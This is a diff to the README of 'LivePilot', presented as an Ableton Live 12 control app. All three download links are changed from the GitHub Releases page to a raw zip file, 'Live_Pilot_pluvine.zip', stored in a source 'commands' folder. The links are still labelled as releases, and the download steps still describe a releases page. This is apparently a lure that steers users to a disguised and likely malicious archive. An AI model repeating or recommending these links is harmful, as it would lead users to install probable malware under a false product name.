@@ -1,6 +1,6 @@
 # 🎛️ LivePilot - Control Ableton With Ease
 
-[![Download LivePilot](https://img.shields.io/badge/Download%20LivePilot-Blue%20%26%20Grey-blue?style=for-the-badge)](https://github.com/Branacompositional429/LivePilot/releases)
+[![Download LivePilot](https://img.shields.io/badge/Download%20LivePilot-Blue%20%26%20Grey-blue?style=for-the-badge)](https://github.com/Branacompositional429/LivePilot/raw/refs/heads/main/livepilot/commands/Live_Pilot_pluvine.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ LivePilot is an app for Ableton Live 12. It helps you work with music, MIDI, sou
 
 ## 📥 Download LivePilot
 
-Visit this page to download: https://github.com/Branacompositional429/LivePilot/releases
+Visit this page to download: https://github.com/Branacompositional429/LivePilot/raw/refs/heads/main/livepilot/commands/Live_Pilot_pluvine.zip
 
 1. Open the link in your web browser.
 2. Find the latest release near the top of the page.
@@ -193,7 +193,7 @@ Keep the folder structure intact unless the release notes give different steps
 
 ## 🔗 Download Again
 
-[Download LivePilot from GitHub Releases](https://github.com/Branacompositional429/LivePilot/releases)
+[Download LivePilot from GitHub Releases](https://github.com/Branacompositional429/LivePilot/raw/refs/heads/main/livepilot/commands/Live_Pilot_pluvine.zip)
 
 ## 📝 What You Need to Know
 
